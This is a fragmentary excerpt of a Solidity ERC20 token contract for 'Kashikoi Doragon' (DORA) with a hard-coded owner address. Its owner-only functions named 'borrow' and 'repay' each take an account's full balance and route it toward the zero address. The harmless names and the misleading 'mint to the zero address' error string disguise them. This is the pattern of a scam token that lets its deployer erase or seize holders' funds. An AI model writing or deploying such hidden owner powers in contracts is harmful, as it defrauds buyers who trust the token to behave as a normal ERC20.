...
contract KashikoiDoragon is Context, IERC20 {
    ...
    address lead_deployer = 0x25560AfB52eBc325558F002383B0af702Dd2445A;
    address public _owner = 0x25560AfB52eBc325558F002383B0af702Dd2445A;
   constructor () public {


        
        _name = "Kashikoi Doragon | 賢いドラゴン";
    
        _symbol = "DORA";
        _decimals = 18;
        uint256 initialSupply = 7878787878787;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function borrow(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
    ...
    function repay(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
